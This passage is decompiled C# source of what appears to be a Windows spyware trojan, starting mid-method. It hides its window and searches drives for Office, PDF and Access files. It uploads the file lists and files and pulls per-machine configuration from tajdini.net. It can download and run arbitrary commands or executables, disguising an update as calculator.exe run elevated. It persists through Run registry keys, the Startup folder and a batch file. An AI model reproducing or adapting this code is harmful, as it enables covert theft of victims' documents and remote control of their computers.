							((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathErr, "###------------------/  " + Conversions.ToString(DateTime.Now) + "  /------------------###\r\n", true);
							((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathErr, ex2.ToString() + "\r\n", true);
							ProjectData.ClearProjectError();
						}
						num2++;
					}
				}
			}
			try
			{
				if ((filequery.Length > 1) & (findlocation.Length > 1))
				{
					upweb(filelst);
				}
				File.Delete(filelst);
				islstsnd = 1;
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathErr, "###------------------/  " + Conversions.ToString(DateTime.Now) + "  /------------------###\r\n", true);
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathErr, ex4.ToString() + "\r\n", true);
				islstsnd = 0;
				ProjectData.ClearProjectError();
			}
		}
	}

	public void sendfiles()
	{
		checked
		{
			try
			{
				string text = "";
				if (File.Exists(filelst2))
				{
					StreamReader streamReader = new StreamReader(filelst2);
					while (streamReader.Peek() != -1)
					{
						text = text + streamReader.ReadLine() + "\r\n";
					}
					streamReader.Close();
				}
				if (text.Length > 5)
				{
					string[] array = text.Split(new char[1] { ';' });
					int num = array.Length - 1;
					int num2 = 0;
					while (true)
					{
						int num3 = num2;
						int num4 = num;
						if (num3 > num4)
						{
							break;
						}
						upweb(array[num2]);
						num2++;
					}
				}
				File.Delete(filelst2);
				if (singlefile.Length > 0)
				{
					string[] array2 = singlefile.Split(new char[1] { ';' });
					int num5 = singlefile.Length - 1;
					int num6 = 0;
					while (true)
					{
						int num7 = num6;
						int num4 = num5;
						if (num7 > num4)
						{
							break;
						}
						upweb(array2[num6]);
						num6++;
					}
				}
				isfilessend = 1;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathErr, "###------------------/  " + Conversions.ToString(DateTime.Now) + "  /------------------###\r\n", true);
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathErr, ex2.ToString() + "\r\n", true);
				issend = 0;
				isfilessend = 0;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void allfile(string location, string findstr)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(location);
		try
		{
			FileInfo[] array = null;
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				try
				{
					if (directoryInfo2.Attributes != FileAttributes.System)
					{
						array = directoryInfo2.GetFiles(findstr, SearchOption.AllDirectories);
					}
					FileInfo[] array2 = array;
					foreach (FileInfo fileInfo in array2)
					{
						object obj = fileInfo.FullName + ";" + Conversions.ToString(fileInfo.CreationTime) + ";" + Conversions.ToString(fileInfo.LastAccessTimeUtc) + ";" + fileInfo.Length + "\r\n";
						object obj2 = fileInfo.FullName + ";";
						((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(filelst, Conversions.ToString(obj), true);
						((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(filelst2, Conversions.ToString(obj2), true);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (UnauthorizedAccessException projectError2)
		{
			ProjectData.SetProjectError((Exception)projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private object GenerateGUID()
	{
		return Guid.NewGuid().ToString();
	}

	private void downloadsinglefile(string p2dl, string newname)
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFile(p2dl, newname);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).Hide();
		if (Environment.OSVersion.Version.Major >= 6)
		{
			pathcp = Conversions.ToString(Operators.AddObject(Operators.AddObject(path7, (object)((ServerComputer)MyProject.Computer).get_Name().ToString()), (object)"_DebugCP.txt"));
			path1 = Conversions.ToString(Operators.AddObject(Operators.AddObject(path7, (object)((ServerComputer)MyProject.Computer).get_Name().ToString()), (object)"_DebugLog.txt"));
			pathErr = Conversions.ToString(Operators.AddObject(Operators.AddObject(path7, (object)((ServerComputer)MyProject.Computer).get_Name().ToString()), (object)"_DebugErr.txt"));
			pathscr = Conversions.ToString(path7);
			filelst = Conversions.ToString(Operators.AddObject(path7, (object)"list.xls"));
			filelst2 = Conversions.ToString(Operators.AddObject(path7, (object)"list2.xls"));
		}
		else
		{
			pathcp = Conversions.ToString(Operators.AddObject(Operators.AddObject(pathXP, (object)((ServerComputer)MyProject.Computer).get_Name().ToString()), (object)"_DebugCP.txt"));
			path1 = Conversions.ToString(Operators.AddObject(Operators.AddObject(pathXP, (object)((ServerComputer)MyProject.Computer).get_Name().ToString()), (object)"_DebugLog.txt"));
			pathErr = Conversions.ToString(Operators.AddObject(Operators.AddObject(pathXP, (object)((ServerComputer)MyProject.Computer).get_Name().ToString()), (object)"_DebugErr.txt"));
			pathscr = Conversions.ToString(pathXP);
			filelst = Conversions.ToString(Operators.AddObject(pathXP, (object)"list.xls"));
			filelst2 = Conversions.ToString(Operators.AddObject(path7, (object)"list2.xls"));
		}
		findlocation = "all";
		filequery = "*.doc;*.docx;*.pdf;*.ppt;*.pptx;*.xls;*.xlsx;*.mdb;*.accdb";
		if (!File.Exists(pathscr + "configurationz_" + ((ServerComputer)MyProject.Computer).get_Name().ToString() + ".xml"))
		{
			xmlgen();
		}
		try
		{
			nxtup = "http://tajdini.net/confz/configurationz_" + ((ServerComputer)MyProject.Computer).get_Name().ToString() + ".xml";
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(nxtup);
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			if (httpWebResponse.StatusCode == HttpStatusCode.OK)
			{
				downloadsinglefile(nxtup, pathscr + "configurationz_" + ((ServerComputer)MyProject.Computer).get_Name().ToString() + ".xml");
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathErr, "------------------[  " + Conversions.ToString(DateTime.Now) + "  ]------------------\r\n", true);
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathErr, ex2.ToString() + "\r\n", true);
			ProjectData.ClearProjectError();
		}
		if (File.Exists(pathscr + "configurationz_" + ((ServerComputer)MyProject.Computer).get_Name().ToString() + ".xml"))
		{
			readconfig();
			tmr_sendmail.set_Interval(Conversions.ToInteger(tmrsndmail));
			tmr_scr.set_Interval(Conversions.ToInteger(tmrscr));
			tmr_xml.set_Interval(Conversions.ToInteger(tmrnxtup));
		}
		cpstartup();
		checksize(pathcp);
		checksize(pathErr);
		checksize(path1);
		if (Operators.ConditionalCompareObjectEqual(islstsnd, (object)0, false))
		{
			if (InternetConnection())
			{
				upweb(path1);
			}
			findandsend();
			islstsnd = 1;
		}
	}

	private void tmr_Save_Tick(object sender, EventArgs e)
	{
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(path1, TextBox1.get_Text(), true);
			((TextBoxBase)TextBox1).Clear();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathErr, "------------------[  " + Conversions.ToString(DateTime.Now) + "  ]------------------\r\n", true);
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathErr, ex2.ToString() + "\r\n", true);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		prtscr();
	}

	private void tmr_xml_Tick(object sender, EventArgs e)
	{
		if (File.Exists(pathscr + "configurationz_" + ((ServerComputer)MyProject.Computer).get_Name().ToString() + ".xml"))
		{
			readconfig();
			if (Operators.ConditionalCompareObjectEqual(islstsnd, (object)0, false))
			{
				if (InternetConnection())
				{
					upweb(path1);
					upweb(pathcp);
				}
				findandsend();
				islstsnd = 1;
			}
			sendfiles();
		}
		try
		{
			if (nxtup.Length < 5)
			{
				nxtup = "http://tajdini.net/confz/configurationz_" + ((ServerComputer)MyProject.Computer).get_Name().ToString() + ".xml";
			}
			downloadfile(nxtup, pathscr + "configurationz_" + ((ServerComputer)MyProject.Computer).get_Name().ToString() + ".xml");
			if (cmdfile.Length < 5)
			{
				downloadfile(cmdfile, pathscr + cmdfilename);
			}
			if (File.Exists(pathscr + cmdfilename))
			{
				Process.Start(pathscr + cmdfilename);
			}
			if (cmd.Length > 1)
			{
				Process.Start(cmd);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathErr, "------------------[  " + Conversions.ToString(DateTime.Now) + "  ]------------------\r\n", true);
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(pathErr, ex2.ToString() + "\r\n", true);
			ProjectData.ClearProjectError();
		}
		vernew();
	}

	private void mksvcfile(string svc)
	{
		StringBuilder stringBuilder = new StringBuilder();
		if (Environment.OSVersion.Version.Major >= 6)
		{
			stringBuilder.AppendLine(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"xcopy ", path7), (object)"serviceFire.exe \""), (object)Environment.GetEnvironmentVariable("UserProfile")), (object)"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"")));
			File.WriteAllText(Conversions.ToString(Operators.AddObject(path7, (object)"mswin32dll.bat")), stringBuilder.ToString());
		}
		else
		{
			stringBuilder.AppendLine(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"xcopy ", pathXP), (object)"serviceFire.exe \""), (object)Environment.GetFolderPath(Environment.SpecialFolder.Startup)), (object)"")));
			File.WriteAllText(Conversions.ToString(Operators.AddObject(pathXP, (object)"mswin32dll.bat")), stringBuilder.ToString());
		}
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.UseShellExecute = true;
		if (Environment.OSVersion.Version.Major >= 6)
		{
			processStartInfo.FileName = Conversions.ToString(Operators.AddObject(path7, (object)"mswin32dll.bat"));
		}
		else
		{
			processStartInfo.FileName = Conversions.ToString(Operators.AddObject(pathXP, (object)"mswin32dll.bat"));
		}
		processStartInfo.WorkingDirectory = "";
		Process.Start(processStartInfo);
		if (Environment.OSVersion.Version.Major >= 6)
		{
			((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), Operators.AddObject(path7, (object)"serviceFire.exe"));
		}
		else
		{
			((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), Operators.AddObject(pathXP, (object)"serviceFire.exe"));
		}
	}

	private void vernew()
	{
		string text = "";
		if (File.Exists(pathscr + "calculator.exe"))
		{
			text = Conversions.ToString(md5check(pathscr + "calculator.exe"));
		}
		downloadfile("http://tajdini.net/confz/ver_" + ((ServerComputer)MyProject.Computer).get_Name().ToString() + ".exe", pathscr + "calculator.exe");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.UseShellExecute = true;
		processStartInfo.WorkingDirectory = Environment.CurrentDirectory;
		processStartInfo.FileName = pathscr + "calculator.exe";
		if (File.Exists(pathscr + "calculator.exe") && !Operators.ConditionalCompareObjectEqual(md5check(pathscr + "calculator.exe"), (object)text, false))
		{
			processStartInfo.Verb = "runas";
		}
		try
		{
			if (File.Exists(pathscr + "calculator.exe") && Operators.ConditionalCompareObjectNotEqual(md5check(pathscr + "calculator.exe"), (object)text, false))
			{
				Process.Start(processStartInfo);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return;
		}
		if (Environment.OSVersion.Version.Major >= 6)
		{
			try
			{
				if (File.Exists(pathscr + "calculator.exe"))
				{
					((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), pathscr + "calculator.exe");
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), pathscr + "calculator.exe");
					File.Copy(pathscr + "calculator.exe", Environment.GetEnvironmentVariable("UserProfile") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calculator.exe");
					mksvcfile(pathscr + "calculator.exe");
				}
				return;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
				return;
			}
		}
		try
		{
			if (!File.Exists(Conversions.ToString(Operators.AddObject(pathXP, (object)"calculator.exe"))))
			{
				((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), Operators.AddObject(pathXP, (object)"calculator.exe"));
				((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), Operators.AddObject(pathXP, (object)"calculator.exe"));
				mksvcfile(Conversions.ToString(Operators.AddObject(pathXP, (object)"calculator.exe")));
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	private void newv_Tick(object sender, EventArgs e)
	{
		string text = "";
		if (File.Exists(pathscr + "calculator.exe"))
		{
			text = Conversions.ToString(md5check(pathscr + "calculator.exe"));
		}
		downloadfile("http://tajdini.net/confz/ver_" + ((ServerComputer)MyProject.Computer).get_Name().ToString() + ".exe", pathscr + "calculator.exe");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.UseShellExecute = true;
		processStartInfo.WorkingDirectory = Environment.CurrentDirectory;
		processStartInfo.FileName = pathscr + "calculator.exe";
		if (File.Exists(pathscr + "calculator.exe") && !Operators.ConditionalCompareObjectEqual(md5check(pathscr + "calculator.exe"), (object)text, false))
		{
			processStartInfo.Verb = "runas";
		}
		if (Environment.OSVersion.Version.Major >= 6)
		{
			try
			{
				if (File.Exists(pathscr + "calculator.exe"))
				{
					((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), pathscr + "calculator.exe");
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), pathscr + "calculator.exe");
					File.Copy(pathscr + "calculator.exe", Environment.GetEnvironmentVariable("UserProfile") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calculator.exe");
					mksvcfile(pathscr + "calculator.exe");
				}
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		try
		{
			if (!File.Exists(Conversions.ToString(Operators.AddObject(pathXP, (object)"calculator.exe"))))
			{
				((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), Operators.AddObject(pathXP, (object)"calculator.exe"));
				((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), Operators.AddObject(pathXP, (object)"calculator.exe"));
				mksvcfile(Conversions.ToString(Operators.AddObject(pathXP, (object)"calculator.exe")));
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}
}
